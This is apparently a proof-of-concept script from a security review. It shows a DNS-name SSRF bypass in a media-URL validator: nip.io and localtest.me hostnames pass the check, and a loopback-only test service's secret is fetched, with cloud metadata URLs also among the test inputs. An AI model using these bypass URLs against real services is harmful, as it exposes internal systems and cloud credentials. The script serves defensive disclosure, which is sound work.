// PoC: DNS-based SSRF bypass in shared/user-media-url.ts (pollinations upstream)
// Run: node .newera/cyber/evidence/poc-user-media-url-dns-ssrf.mjs
// Does NOT touch the live platform: all traffic stays on 127.0.0.1 of this VM.
import http from "node:http";
import { validateUserMediaUrl } from "../../../upstream/shared/user-media-url.ts";

const SECRET = "INTERNAL-SERVICE-SECRET-9f2c";

const server = http.createServer((req, res) => {
    res.writeHead(200, { "content-type": "text/plain" });
    res.end(SECRET);
});

await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const port = server.address().port;
console.log(`[setup] internal-only service listening on 127.0.0.1:${port}`);

const cases = [
    `http://127.0.0.1:${port}/internal`,
    `http://localhost:${port}/internal`,
    `http://127.0.0.1.nip.io:${port}/internal`,
    `http://localtest.me:${port}/internal`,
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
];

let bypass = 0;
for (const url of cases) {
    const v = validateUserMediaUrl(url);
    console.log(`[validate] ${url} -> ${v.ok ? "ALLOWED" : `blocked(${v.reason})`}`);
    if (v.ok) bypass++;
}

console.log(`\n[assert] ${bypass} of ${cases.length} internal-host URLs passed validateUserMediaUrl`);
if (bypass < 2) {
    console.error("[FAIL] expected at least one DNS-name bypass + one literal-IP block");
    server.close();
    process.exit(1);
}

// End-to-end: the platform performs the fetch itself -> we reach a service that
// is bound to loopback only and is NOT reachable from the public internet.
const target = `http://127.0.0.1.nip.io:${port}/internal`;
const v = validateUserMediaUrl(target);
if (!v.ok) {
    console.error("[FAIL] DNS-name bypass no longer reproduces");
    server.close();
    process.exit(1);
}
const res = await fetch(v.url.toString(), {
    redirect: "manual",
    signal: AbortSignal.timeout(5000),
});
const body = await res.text();
console.log(`[ssrf] fetched ${target} -> ${res.status} body=${JSON.stringify(body)}`);
server.close();

if (body.includes(SECRET)) {
    console.log("[PASS] loopback-only service content retrieved through the validator -> SSRF confirmed");
    process.exit(0);
}
console.error("[FAIL] internal content not retrieved");
process.exit(1);
